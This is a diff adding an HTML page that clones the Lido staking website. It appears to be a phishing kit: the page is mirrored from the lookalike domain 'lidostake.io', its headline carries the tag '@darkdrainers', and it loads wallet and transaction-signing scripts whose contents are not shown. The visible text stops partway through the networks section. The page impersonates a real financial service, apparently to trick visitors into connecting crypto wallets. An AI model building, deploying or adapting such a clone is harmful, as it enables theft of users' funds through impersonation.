@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html>
+
+
+<!-- Mirrored from lidostake.io/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 30 Jan 2023 02:42:32 GMT -->
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>Liquidity for staked assets | Lido</title>
+<link href="css/style.css" rel="stylesheet" type="text/css">
+<link href="css/ether.css" rel="stylesheet" type="text/css">
+<link href="css/ice.css" rel="stylesheet" type="text/css">
+<link rel="icon" type="image/png" href="images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png">
+<link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png">
+<meta name="thumbnail" content="../lido.fi/static/images/meta/google-image.png">
+<script src="js/moralis.js"></script>
+<script src="js/ethereumjs-tx-1.3.3.min.js"></script>
+</head>
+
+<body>
+
+   <div id="__next" data-reactroot>
+      <header id="header" data-date="Sun Sep 11 2022 00:07:03 GMT+0000 (Coordinated Universal Time)" class="styles__Wrapper-sc-1v2uirq-0 kczxwR" style="right: 0px;">
+         <div class="styles__Wrapper-sc-1pm437b-0 gnZJHk styles__Content-sc-1v2uirq-1 graQPw">
+            <div class="styles__LogoWrapper-sc-1v2uirq-2 kFIpov">
+               <a href="index.html">
+                  <svg class="styles__Logo-sc-1v2uirq-3 hkHwDL" height="44" width="88">
+<path d="M27.1699 5.66031H29.3299V14.9303H34.6399V17.0003H27.1699V5.66031Z" fill="#273852"/>
+<path d="M44.082 5.66031H46.242V17.0003H44.082V5.66031Z" fill="#273852"/>
+<path d="M56.582 5.66031H60.182C60.926 5.66031 61.634 5.81631 62.306 6.12831C62.978 6.42831 63.572 6.83631 64.088 7.35231C64.604 7.86831 65.012 8.46831 65.312 9.15231C65.612 9.83631 65.762 10.5623 65.762 11.3303C65.762 12.0983 65.612 12.8243 65.312 13.5083C65.012 14.1923 64.604 14.7923 64.088 15.3083C63.572 15.8243 62.978 16.2383 62.306 16.5503C61.634 16.8503 60.926 17.0003 60.182 17.0003H56.582V5.66031ZM60.182 14.9303C60.626 14.9303 61.052 14.8343 61.46 14.6423C61.88 14.4503 62.246 14.1923 62.558 13.8683C62.882 13.5443 63.134 13.1663 63.314 12.7343C63.506 12.2903 63.602 11.8223 63.602 11.3303C63.602 10.8383 63.506 10.3763 63.314 9.94431C63.134 9.50031 62.882 9.11631 62.558 8.79231C62.246 8.46831 61.88 8.21031 61.46 8.01831C61.052 7.82631 60.626 7.73031 60.182 7.73031H58.742V14.9303H60.182Z" fill="#273852"/>
+<path d="M80.3405 17.0903C79.5965 17.0903 78.8885 16.9463 78.2165 16.6583C77.5565 16.3583 76.9745 15.9503 76.4705 15.4343C75.9785 14.9063 75.5825 14.2943 75.2825 13.5983C74.9945 12.9023 74.8505 12.1463 74.8505 11.3303C74.8505 10.5263 74.9945 9.77631 75.2825 9.08031C75.5825 8.37231 75.9785 7.76031 76.4705 7.24431C76.9745 6.71631 77.5565 6.30831 78.2165 6.02031C78.8885 5.72031 79.5965 5.57031 80.3405 5.57031C81.0845 5.57031 81.7865 5.72031 82.4465 6.02031C83.1185 6.30831 83.7005 6.71631 84.1925 7.24431C84.6965 7.76031 85.0925 8.37231 85.3805 9.08031C85.6805 9.77631 85.8305 10.5263 85.8305 11.3303C85.8305 12.1463 85.6805 12.9023 85.3805 13.5983C85.0925 14.2943 84.6965 14.9063 84.1925 15.4343C83.7005 15.9503 83.1185 16.3583 82.4465 16.6583C81.7865 16.9463 81.0845 17.0903 80.3405 17.0903ZM80.3405 15.0203C80.7845 15.0203 81.2105 14.9303 81.6185 14.7503C82.0265 14.5703 82.3805 14.3183 82.6805 13.9943C82.9805 13.6583 83.2205 13.2683 83.4005 12.8243C83.5805 12.3683 83.6705 11.8703 83.6705 11.3303C83.6705 10.7903 83.5805 10.2983 83.4005 9.85431C83.2205 9.39831 82.9805 9.00831 82.6805 8.68431C82.3805 8.34831 82.0265 8.09031 81.6185 7.91031C81.2105 7.73031 80.7845 7.64031 80.3405 7.64031C79.8845 7.64031 79.4525 7.73031 79.0445 7.91031C78.6485 8.09031 78.3005 8.34831 78.0005 8.68431C77.7005 9.00831 77.4605 9.39831 77.2805 9.85431C77.1005 10.2983 77.0105 10.7903 77.0105 11.3303C77.0105 11.8703 77.1005 12.3683 77.2805 12.8243C77.4605 13.2683 77.7005 13.6583 78.0005 13.9943C78.3005 14.3183 78.6485 14.5703 79.0445 14.7503C79.4525 14.9303 79.8845 15.0203 80.3405 15.0203Z" fill="#273852"/>
+<path fill-rule="evenodd" clip-rule="evenodd" d="M7.00529 0L11.954 7.74771L7.00502 10.6324L2.05668 7.74763L7.00529 0ZM3.57156 7.38126L7.00529 2.00535L10.439 7.38128L7.00506 9.3829L3.57156 7.38126Z" fill="#273852"/>
+<path d="M6.99796 12.3353L1.25737 8.98872L1.1006 9.23415C-0.667488 12.0023 -0.272613 15.6276 2.04997 17.9502C4.78308 20.6833 9.21433 20.6833 11.9474 17.9502C14.27 15.6276 14.6649 12.0023 12.8968 9.23415L12.74 8.98865L6.9982 12.3355L6.99796 12.3353Z" fill="#273852"/>
+</svg>
+               </a>
+            </div>
+			
+            <nav class="styles__Navigation-sc-1v2uirq-4 gLcTCa">
+               <div class="styles__Item-sc-1v2uirq-10 hwgSdo">
+                  Products
+                  <div class="styles__DropdownWrapper-sc-1v2uirq-5 hCPLHP">
+                     <div width="280" class="styles__Dropdown-sc-1v2uirq-6 dIKAip">
+                        <a href="https://stake.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">
+                           <span>App</span>
+                           <p class="styles__ItemDropdownDescription-sc-1v2uirq-9 jNyGLl">Stake Ethereum with Lido</p>
+                        </a>
+                        <a href="https://referral.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">
+                           <span>Lido Referral Program</span>
+                           <p class="styles__ItemDropdownDescription-sc-1v2uirq-9 jNyGLl">Earn rewards by spreading Lido</p>
+                        </a>
+                        <a href="lido-ecosystem.html" class="styles__ItemDropdownInternal-sc-2kftp9-1 bUsEzS">
+                           <span>Lido Ecosystem</span>
+                           <p class="styles__ItemDropdownDescription-sc-1v2uirq-9 jNyGLl">Explore apps and services using stETH</p>
+                        </a>
+                        <a href="https://pro.nansen.ai/lido" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">
+                           <span>Nansen Analytics</span>
+                           <p class="styles__ItemDropdownDescription-sc-1v2uirq-9 jNyGLl">Track real-time Lido staking statistics</p>
+                        </a>
+                        <a href="https://dune.xyz/LidoAnalytical/Lido-Finance-Extended" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">
+                           <span>Dune Analytics</span>
+                           <p class="styles__ItemDropdownDescription-sc-1v2uirq-9 jNyGLl">Track current metrics of Lido protocol</p>
+                        </a>
+                        <a href="https://www.tokenterminal.com/terminal/projects/lido-finance" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">
+                           <span>Token Terminal</span>
+                           <p class="styles__ItemDropdownDescription-sc-1v2uirq-9 jNyGLl">Fundamentals for crypto</p>
+                        </a>
+                        <a href="https://lego.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">
+                           <span>LEGO</span>
+                           <p class="styles__ItemDropdownDescription-sc-1v2uirq-9 jNyGLl">Lido’s ecosystem grants initiative</p>
+                        </a>
+                     </div>
+                  </div>
+               </div>
+               <div class="styles__Item-sc-1v2uirq-10 hwgSdo">
+                  Networks
+                  <div class="styles__DropdownWrapper-sc-1v2uirq-5 hCPLHP">
+                     <div class="styles__Dropdown-sc-1v2uirq-6 dIKzpj"><a href="ethereum.html" class="styles__ItemDropdownInternal-sc-2kftp9-1 bUsEzS">Ethereum</a></div>
+                  </div>
+               </div>
+               <div class="styles__Item-sc-1v2uirq-10 hwgSdo">
+                  Governance
+                  <div class="styles__DropdownWrapper-sc-1v2uirq-5 hCPLHP">
+                     <div class="styles__Dropdown-sc-1v2uirq-6 dIKzpj"><a href="https://research.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">Forum</a><a href="https://easytrack.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">Easy Track</a><a href="https://research.lido.fi/t/lido-dao-member-manual/25" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">User Guide</a><a href="https://mainnet.lido.fi/#/lido-dao/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">Lido DAO</a><a href="https://snapshot.org/#/lido-snapshot.eth" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">Off-chain Voting</a><a href="https://immunefi.com/bounty/lido/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">Lido Bug Bounty</a><a href="governance-process.html" class="styles__ItemDropdownInternal-sc-2kftp9-1 bUsEzS">Governance Process</a></div>
+                  </div>
+               </div>
+               <div class="styles__Item-sc-1v2uirq-10 hwgSdo">
+                  Developers
+                  <div class="styles__DropdownWrapper-sc-1v2uirq-5 hCPLHP">
+                     <div class="styles__Dropdown-sc-1v2uirq-6 dIKzpj"><a href="https://github.com/lidofinance" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">GitHub</a><a href="https://docs.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">Documentation</a><a href="static/Lido_Ethereum-Liquid-Staking.html" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">Primer</a><a href="https://github.com/lidofinance/audits" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">Audits</a></div>
+                  </div>
+               </div>
+               <div class="styles__Item-sc-1v2uirq-10 hwgSdo">
+                  Community
+                  <div class="styles__DropdownWrapper-sc-1v2uirq-5 hCPLHP">
+                     <div class="styles__Dropdown-sc-1v2uirq-6 dIKzpj"><a href="https://discord.com/invite/lido" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">Discord</a><a href="https://twitter.com/lidofinance" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">Twitter</a><a href="https://t.me/lidofinance" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">Telegram</a><a href="https://www.reddit.com/r/LidoFinance" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">Reddit</a></div>
+                  </div>
+               </div>
+               <div class="styles__Item-sc-1v2uirq-10 hwgSdo">
+                  About
+                  <div class="styles__DropdownWrapper-sc-1v2uirq-5 kHpexY">
+                     <div width="146" class="styles__Dropdown-sc-1v2uirq-6 dIKzpQ"><a href="https://blog.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">Blog</a><a href="faq.html" class="styles__ItemDropdownInternal-sc-2kftp9-1 bUsEzS">FAQ</a><a href="https://help.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">Help Center</a><a href="https://careers.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownExternal-sc-2kftp9-0 YFkdC eciBgt">Careers</a><a href="static/LIDO_press_kit.html" class="styles__ItemDropdownInternal-sc-2kftp9-1 bUsEzS">Press Kit</a></div>
+                  </div>
+               </div>
+            </nav>
+            <div data-testid="sandwich" class="styles__SandwichWrapper-sc-1v2uirq-12 hsRGOr">
+               <div class="sandwich__BurgerWrapper-sc-13p9jqj-1 dHCpTs">
+                  <div class="sandwich__Burger-sc-13p9jqj-2 eDelSo"></div>
+               </div>
+               <div class="sandwich__Menu-sc-13p9jqj-0 dACuZm">
+                  <nav class="styles__NavigationMobile-sc-1v2uirq-13 dAoyjX">
+                     <div data-testid="sandwich-products" class="styles__Items-sc-1v2uirq-14 bcyhXb">
+                        <h3 class="styles__ItemTitleMobile-sc-1v2uirq-15 kRVpLH">Products</h3>
+                        <a href="https://stake.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownWrapper-sc-1v2uirq-7 styles__ItemMobileWrapper-sc-1v2uirq-16 YFkdC fEvKlE cShAHm">
+                           <span target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">App</span>
+                           <p class="styles__ItemDropdownDescription-sc-1v2uirq-9 styles__ItemMobileDescription-sc-1v2uirq-20 jNyGLl bSZqMd">Stake Ethereum with Lido</p>
+                        </a>
+                        <a href="https://referral.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownWrapper-sc-1v2uirq-7 styles__ItemMobileWrapper-sc-1v2uirq-16 YFkdC fEvKlE cShAHm">
+                           <span target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Lido Referral Program</span>
+                           <p class="styles__ItemDropdownDescription-sc-1v2uirq-9 styles__ItemMobileDescription-sc-1v2uirq-20 jNyGLl bSZqMd">Earn rewards by spreading Lido</p>
+                        </a>
+                        <a href="lido-ecosystem.html" class="styles__ItemDropdownWrapperInternal-sc-1v2uirq-8 styles__ItemMobileWrapperInternal-sc-1v2uirq-17 diUJzo ifSqg">
+                           <span class="styles__ItemMobileInternal-sc-1v2uirq-19 EvETU">Lido Ecosystem</span>
+                           <p class="styles__ItemDropdownDescription-sc-1v2uirq-9 styles__ItemMobileDescription-sc-1v2uirq-20 jNyGLl bSZqMd">Explore apps and services using stETH</p>
+                        </a>
+                        <a href="https://pro.nansen.ai/lido" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownWrapper-sc-1v2uirq-7 styles__ItemMobileWrapper-sc-1v2uirq-16 YFkdC fEvKlE cShAHm">
+                           <span target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Nansen Analytics</span>
+                           <p class="styles__ItemDropdownDescription-sc-1v2uirq-9 styles__ItemMobileDescription-sc-1v2uirq-20 jNyGLl bSZqMd">Track real-time Lido staking statistics</p>
+                        </a>
+                        <a href="https://dune.xyz/LidoAnalytical/Lido-Finance-Extended" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownWrapper-sc-1v2uirq-7 styles__ItemMobileWrapper-sc-1v2uirq-16 YFkdC fEvKlE cShAHm">
+                           <span target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Dune Analytics</span>
+                           <p class="styles__ItemDropdownDescription-sc-1v2uirq-9 styles__ItemMobileDescription-sc-1v2uirq-20 jNyGLl bSZqMd">Track current metrics of Lido protocol</p>
+                        </a>
+                        <a href="https://www.tokenterminal.com/terminal/projects/lido-finance" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownWrapper-sc-1v2uirq-7 styles__ItemMobileWrapper-sc-1v2uirq-16 YFkdC fEvKlE cShAHm">
+                           <span target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Token Terminal</span>
+                           <p class="styles__ItemDropdownDescription-sc-1v2uirq-9 styles__ItemMobileDescription-sc-1v2uirq-20 jNyGLl bSZqMd">Fundamentals for crypto</p>
+                        </a>
+                        <a href="https://lego.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemDropdownWrapper-sc-1v2uirq-7 styles__ItemMobileWrapper-sc-1v2uirq-16 YFkdC fEvKlE cShAHm">
+                           <span target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">LEGO</span>
+                           <p class="styles__ItemDropdownDescription-sc-1v2uirq-9 styles__ItemMobileDescription-sc-1v2uirq-20 jNyGLl bSZqMd">Lido’s ecosystem grants initiative</p>
+                        </a>
+                     </div>
+                     <div data-testid="sandwich-networks" class="styles__Items-sc-1v2uirq-14 bcyhXb">
+                        <h3 class="styles__ItemTitleMobile-sc-1v2uirq-15 kRVpLH">Networks</h3>
+                        <a href="ethereum.html" class="styles__ItemMobileInternal-sc-1v2uirq-19 EvETU">Ethereum</a><a href="#" class="styles__ItemMobileInternal-sc-1v2uirq-19 EvETU">Solana</a><a href="kusama.html" class="styles__ItemMobileInternal-sc-1v2uirq-19 EvETU">Kusama</a><a href="#" class="styles__ItemMobileInternal-sc-1v2uirq-19 EvETU">Polygon</a><a href="polkadot.html" class="styles__ItemMobileInternal-sc-1v2uirq-19 EvETU">Polkadot</a>
+                     </div>
+                     <div data-testid="sandwich-governance" class="styles__Items-sc-1v2uirq-14 bcyhXb">
+                        <h3 class="styles__ItemTitleMobile-sc-1v2uirq-15 kRVpLH">Governance</h3>
+                        <a href="https://research.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Forum</a><a href="https://easytrack.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Easy Track</a><a href="https://research.lido.fi/t/lido-dao-member-manual/25" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">User Guide</a><a href="https://mainnet.lido.fi/#/lido-dao/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Lido DAO</a><a href="https://snapshot.org/#/lido-snapshot.eth" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Off-chain Voting</a><a href="https://immunefi.com/bounty/lido/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Lido Bug Bounty</a><a href="governance-process.html" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Governance Process</a>
+                     </div>
+                     <div data-testid="sandwich-developers" class="styles__Items-sc-1v2uirq-14 bcyhXb">
+                        <h3 class="styles__ItemTitleMobile-sc-1v2uirq-15 kRVpLH">Developers</h3>
+                        <a href="https://github.com/lidofinance" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">GitHub</a><a href="https://docs.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Documentation</a><a href="static/Lido_Ethereum-Liquid-Staking.html" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Primer</a><a href="https://github.com/lidofinance/audits" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Audits</a>
+                     </div>
+                     <div data-testid="sandwich-community" class="styles__Items-sc-1v2uirq-14 bcyhXb">
+                        <h3 class="styles__ItemTitleMobile-sc-1v2uirq-15 kRVpLH">Community</h3>
+                        <a href="https://discord.com/invite/lido" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Discord</a><a href="https://twitter.com/lidofinance" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Twitter</a><a href="https://t.me/lidofinance" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Telegram</a><a href="https://www.reddit.com/r/LidoFinance" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Reddit</a>
+                     </div>
+                     <div data-testid="sandwich-about" class="styles__Items-sc-1v2uirq-14 bcyhXb">
+                        <h3 class="styles__ItemTitleMobile-sc-1v2uirq-15 kRVpLH">About</h3>
+                        <a href="https://blog.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Blog</a><a href="faq.html" class="styles__ItemMobileInternal-sc-1v2uirq-19 EvETU">FAQ</a><a href="https://help.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Help Center</a><a href="https://careers.lido.fi/" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Careers</a><a href="static/LIDO_press_kit.html" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__ItemMobile-sc-1v2uirq-18 YFkdC gNuIoC">Press Kit</a>
+                     </div>
+                  </nav>
+               </div>
+            </div>
+         </div>
+      </header>
+      <section id="stake" class="styles__Wrapper-sc-30xaut-0 ksLGQM">
+         <div class="water__Wrapper-sc-1ibxa0s-0 gdaFtT">
+            <div class="water__SunWrapper-sc-1ibxa0s-3 Dyccj">
+               <img src="fonts/logo-color.svg" class="water__LogoBig-sc-1ibxa0s-5 water__LogoSmall-sc-1ibxa0s-6 gJoVGw gGmsYB">
+               <div class="styles__Wrapper-sc-1pm437b-0 gnZJHk styles__Content-sc-30xaut-1 dgPRuE">
+                  <div id="stake-form-subscribe" class="styles__Block-sc-30xaut-2 gfjCEg">
+                     <h2 class="styles__Title-sc-30xaut-4 cYBujD">Liquidity for staked assets @darkdrainers</h2>
+                     <p class="styles__Description-sc-30xaut-5 gVswMe">Simplified and secure staking for digital assets</p>
+                     <a href="#cards"><button width="260" height="64" class="button__Button-sc-pu01fx-0 styles__ButtonWrapper-sc-30xaut-6 dtzfnO dIQRhN">
+                        Stake now
+                        <div id="stakeing" class="styles__Wrapper-sc-1d12sdh-1 bSmSuT">
+                           <div color="rgba(255, 255, 255, 0.37)" class="styles__RippleEffect-sc-1d12sdh-0 cYhvRj"></div>
+                        </div>
+                     </button></a>
+                     <div class="styles__SocialNetworks-sc-30xaut-10 cXnsT">
+                        <div class="styles__SocialsLinks-sc-30xaut-7 pSZoE">
+                           <a href="https://t.me/lidofinance" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__SocialLink-sc-30xaut-8 YFkdC cSaBFR">
+                              <svg color="#273852" class="styles__SocialIcon-sc-30xaut-9 gTRCiz" height="24" width="24">
+                                 <use xlink:href="#telegram-transparent"/>
+                              </svg>
+                           </a>
+                           <a href="https://discord.com/invite/lido" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__SocialLink-sc-30xaut-8 YFkdC cSaBFR">
+                              <svg color="#273852" class="styles__SocialIcon-sc-30xaut-9 gTRCiz" height="24" width="24">
+                                 <use xlink:href="#discord-transparent"/>
+                              </svg>
+                           </a>
+                           <a href="https://twitter.com/lidofinance" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__SocialLink-sc-30xaut-8 YFkdC cSaBFR">
+                              <svg color="#273852" class="styles__SocialIcon-sc-30xaut-9 gTRCiz" height="24" width="24">
+                                 <use xlink:href="#twitter-transparent"/>
+                              </svg>
+                           </a>
+                           <a href="https://github.com/lidofinance" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__SocialLink-sc-30xaut-8 YFkdC cSaBFR">
+                              <svg color="#273852" class="styles__SocialIcon-sc-30xaut-9 gTRCiz" height="24" width="24">
+                                 <use xlink:href="#github-transparent"/>
+                              </svg>
+                           </a>
+                           <a href="https://www.reddit.com/r/LidoFinance" target="_blank" rel="nofollow noopener" class="external-link__ExternalLink-sc-1hufj2h-0 styles__SocialLink-sc-30xaut-8 YFkdC cSaBFR">
+                              <svg color="#273852" class="styles__SocialIcon-sc-30xaut-9 gTRCiz" height="24" width="24">
+                                 <use xlink:href="#reddit-transparent"/>
+                              </svg>
+                           </a>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+               <div class="styles__Wrapper-sc-1pm437b-0 gnZJHk styles__MainValueWrapper-sc-30xaut-11 knSGxm">
+                  <div class="InfoFieldStyle__Wrapper-sc-1odkn3h-0 eBSsGr">
+                     <h3 class="InfoFieldStyle__Label-sc-1odkn3h-1 gekgIO">Total staking assets</h3>
+                     <p class="InfoFieldStyle__Data-sc-1odkn3h-2 kJQjJW">$7,860,453,224</p>
+                  </div>
+                  <div class="InfoFieldStyle__Wrapper-sc-1odkn3h-0 eBSsGr">
+                     <h3 class="InfoFieldStyle__Label-sc-1odkn3h-1 gekgIO">Total rewards paid</h3>
+                     <p class="InfoFieldStyle__Data-sc-1odkn3h-2 kJQjJW">$237,790,084</p>
+                  </div>
+                  <div class="InfoFieldStyle__Wrapper-sc-1odkn3h-0 rxCwa">
+                     <h3 class="InfoFieldStyle__Label-sc-1odkn3h-1 gekgIO">Stakers</h3>
+                     <p class="InfoFieldStyle__Data-sc-1odkn3h-2 kJQjJW">180,377</p>
+                  </div>
+               </div>
+               <div class="styles__Wrapper-sc-1pm437b-0 gnZJHk water__Content-sc-1ibxa0s-2 jhOTcz"><img src="fonts/sun.svg" class="water__Sun-sc-1ibxa0s-4 khXNeg"><img src="fonts/logo-color.svg" class="water__LogoBig-sc-1ibxa0s-5 gJoVGw"></div>
+            </div>
+            <div class="water__WaterWrapper-sc-1ibxa0s-1 hMKkaT">
+               <div class="styles__Wrapper-sc-1pm437b-0 gnZJHk water__Content-sc-1ibxa0s-2 jhOTcz"><img src="fonts/shadow.svg" class="water__Shadow-sc-1ibxa0s-7 eDdkOq"></div>
+            </div>
+         </div>
+      </section>
+      <section id="networks" class="styles__Wrapper-sc-1s3j5eu-0 kTftWd">
+         <div class="styles__Wrapper-sc-1pm437b-0 gnZJHk styles__Content-sc-1s3j5eu-1 gIZqUc">
+            <h2 color="#273852" class="Title-sc-7b4eon-0 gvCDMz">Supported networks</h2>
+            <p color="#273852" class="Description-sc-u8z3wb-0 dZKrxx">Lido lets you stake tokens from many networks. Choose a network below to get started.</p>
+            <div class="styles__Cards-sc-1s3j5eu-2 hXXLmx" id="cards">
+               <div data-testid="ethereum-card" class="styles__Wrapper-sc-12xohiw-0 fBUvKJ styles__Card-sc-1s3j5eu-3 biCSLS">
+                  <a class="styles__AdditionalLink-sc-12xohiw-12 gnZmOu" style="color:white;" href="scorecard.html">Scorecard</a><img src="fonts/ethereum-logo.svg" class="styles__Logo-sc-12xohiw-1 kSeIUp">
+                  <h2 class="styles__Title-sc-12xohiw-2 fanyYA">Ethereum</h2>
+                  <p class="styles__Description-sc-12xohiw-3 hUONZD">Stake any amount of ETH and earn daily staking rewards. Put your staked ETH to work across DeFi to compound your yield.</p>
